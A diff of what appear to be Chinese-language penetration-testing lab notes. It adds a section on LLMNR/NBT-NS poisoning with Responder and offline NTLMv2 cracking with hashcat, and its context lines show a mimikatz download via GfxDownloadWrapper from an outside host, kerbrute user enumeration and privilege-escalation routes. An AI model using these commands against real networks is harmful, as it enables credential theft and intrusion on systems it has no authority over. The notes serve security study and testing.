@@ -1036,7 +1036,7 @@ GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
 
 # 六、AD域攻击
 
-**信息收集**
+## 6.1 **信息收集**
 
 外部侦察内容：
 
@@ -1139,6 +1139,32 @@ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_
 - 滥用在 `SYSTEM 帐户`上下文中运行的服务，或使用 [Juicy Potato](https://github.com/ohpe/juicy-potato) 滥用服务帐户 `SeImpersonate` 权限。
 - Windows 操作系统漏洞（如 Windows 10 Task Scheduler 0-day）中的本地权限提升缺陷。
 - 使用本地帐户在已加入域的主机上获得管理员访问权限，并使用 Psexec 启动 SYSTEM cmd 窗口。
+
+## 6.2 网络中毒
+
+对链路本地组播名称解析 （LLMNR，端口5355） 和 NetBIOS 名称服务 （NBT-NS，端口137） 广播的中间人攻击。
+
+这种攻击可能会提供可以离线破解的低权限或管理级别密码哈希，甚至是明文凭据。哈希值有时也可用于执行 SMB 中继攻击，以使用管理权限向域中的一个或多个主机进行身份验证，而无需离线破解密码哈希值。
+
+1.工具:responder
+
+确保以下端口可用
+
+```shell-session
+UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
+```
+
+```
+responder -I ens224 -A
+```
+
+保存的结果文件在/usr/share/responder/logs
+
+2.离线破解
+
+```shell-session
+hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
+```
 
 # 七、Metasploit
 
